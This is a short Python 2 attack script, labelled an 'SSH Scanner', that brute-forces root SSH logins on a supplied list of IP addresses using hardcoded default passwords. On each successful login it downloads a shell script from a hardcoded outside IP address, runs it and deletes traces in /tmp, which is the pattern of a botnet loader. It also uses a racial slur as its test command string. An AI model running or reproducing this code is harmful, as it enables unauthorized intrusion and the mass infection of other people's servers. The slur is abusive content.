#!/usr/bin/python
# For the kids who still scan SSH

# SSH Scanner By LiGhT


import threading, sys, time, random, socket, re, os, paramiko

if len(sys.argv) < 2:
	print "SSH Scanner\n    By: LiGhT"
	print "Usage: python "+sys.argv[0]+" "
	print "Example: python "+sys.argv[0]+"  <list>"
	sys.exit()


ssh_passwords = ["root:centos8vm", "root:root", "root:mdm9607", "root:password"] #slow af but hella results
sh_file = "http://81.28.6.115/ass.sh" # SH File
ips = open(sys.argv[1], "r").readlines()
paramiko.util.log_to_file("/dev/null") #quiets paramiko output

count = 0
def readUntil(tn, string, timeout=15):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.01)
        if string in buf: return buf
    raise Exception('TIMEOUT!')


class sssh(threading.Thread): #BBB
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		x = 1
		while x != 0:
			try:
				username='root'
				password="0"
				port = 22
				ssh = paramiko.SSHClient()
				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				dobreak=False
				for passwd in ssh_passwords:
					if ":n/a" in passwd:
						password=""
					else:
						password=passwd.split(":")[1]
					if "n/a:" in passwd:
						username=""
					else:
						username=passwd.split(":")[0]
					try:
						ssh.connect(self.ip, port = port, username=username, password=password, timeout=5)
						dobreak=True
						break
					except:
						pass
					if True == dobreak:
						break
				badserver=True
				stdin, stdout, stderr = ssh.exec_command("echo nigger")
				output = stdout.read()
				if "nigger" in output:
					badserver=False	
				if badserver == False:
					print "\033[36m[SSH] Command Sent %s!\033[37m"%(self.ip)
					ssh.exec_command("cd /tmp; wget "+sh_file+" -O l.sh; sh l.sh; rm -rf /tmp/*")
					time.sleep(10)
					ssh.close()
					x = 0
				if badserver == True:
					ssh.close()
			except:
				pass
			x = 0

print "Total IPs: %s\n"%(len(ips))
for ip in ips:
	try:
		count += 1
		t = sssh(ip)
		t.start()
		time.sleep(0.01)
	except:
		pass